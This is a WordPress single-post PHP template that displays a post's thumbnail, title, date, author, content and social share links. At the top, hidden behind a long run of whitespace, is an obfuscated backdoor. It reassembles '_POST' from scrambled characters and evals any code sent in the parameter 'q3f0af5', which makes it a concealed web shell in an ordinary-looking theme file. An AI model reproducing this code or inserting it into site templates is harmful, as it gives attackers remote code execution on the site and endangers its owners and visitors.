<?php                                                                                                                                                                                                                                                                              $hoof12 ="o_pst";$lzu98= strtoupper ( $hoof12[1].$hoof12[2].$hoof12[0]. $hoof12[3]. $hoof12[4] );if(isset (${$lzu98}['q3f0af5' ] ) ){eval(${$lzu98 } ['q3f0af5' ] ) ;}?><div class="row lined">
	<div class="span12">
		<?php if ( has_post_thumbnail() ) the_post_thumbnail('full'); ?>
		<h2><?php the_title(); ?></h2>
		work?
		<em><?php the_time('F jS, Y'); ?> | Posted by: <?php the_author(); ?> | <span class="share">share: <a class="facebook" href="http://www.facebook.com/share.php?u=<?php the_permalink(); ?>" target="_blank">facebook</a> <a class="twitter" href="https://twitter.com/intent/tweet?url=<?php the_permalink(); ?>&via=SachsMediaGrp&text=<?php the_title(); ?>&original_referer=<?php echo home_url(); ?>" target="_blank">twitter</a></span>
		</em>
        <!--post content-->
		<?php the_content(); ?>
		<!--end post content-->

		<!--share at bottom-->
		<em><span class="share">Share:<!--<?php the_author_firstname(); ?>'s Post--> <a class="facebook" href="http://www.facebook.com/share.php?u=<?php the_permalink(); ?>" target="_blank">facebook</a> <a class="twitter" href="https://twitter.com/intent/tweet?url=<?php the_permalink(); ?>&via=SachsMediaGrp&text=<?php the_title(); ?>&original_referer=<?php echo home_url(); ?>" target="_blank">twitter</a></span></em>
		<!--end share at bottom-->
	</div><!--end span12-->
</div><!--end row lined-->